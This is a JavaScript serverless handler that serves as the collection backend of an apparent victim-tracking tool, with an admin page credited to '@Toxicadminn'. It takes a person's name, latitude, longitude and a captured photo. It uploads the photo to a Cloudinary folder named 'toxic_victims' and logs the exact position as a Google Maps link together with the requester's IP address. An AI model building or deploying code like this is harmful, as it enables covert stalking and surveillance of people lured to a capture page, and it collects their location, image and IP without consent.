export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    let photoUrl = 'No photo';

    if (data.photo) {
      try {
        const form = new FormData();
        form.append('file', data.photo);
        form.append('upload_preset', 'toxic_uploads');
        form.append('folder', 'toxic_victims');   // Folder set

        const uploadRes = await fetch('https://api.cloudinary.com/v1_1/h5lhwizs/image/upload', {
          method: 'POST',
          body: form
        });

        const uploadData = await uploadRes.json();
        photoUrl = uploadData.secure_url || 'Upload failed';
      } catch(e) {
        console.error("Cloudinary error:", e);
      }
    }

    const logEntry = `\n=== ${new Date().toISOString()} ===\nName: ${data.name || 'Unknown'}\nLat: ${data.lat}\nLon: ${data.lon}\nMap: https://www.google.com/maps?q=${data.lat},${data.lon}\nPhoto: ${photoUrl}\nIP: ${req.headers['x-forwarded-for'] || 'N/A'}\n\n`;

    console.log(logEntry);

    res.status(200).json({ok: true, photo: photoUrl});
  } else {
    res.send(`
      <html><head><title>TOXIC DASHBOARD</title>
      <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}</style>
      </head><body>
        <h1>🔥 TOXIC ADMIN PANEL - @Toxicadminn</h1>
        <p>Check Vercel Function Logs for all details.</p>
        <p>Photos Cloudinary 'toxic_victims' folder mein hain.</p>
      </body></html>
    `);
  }
             }
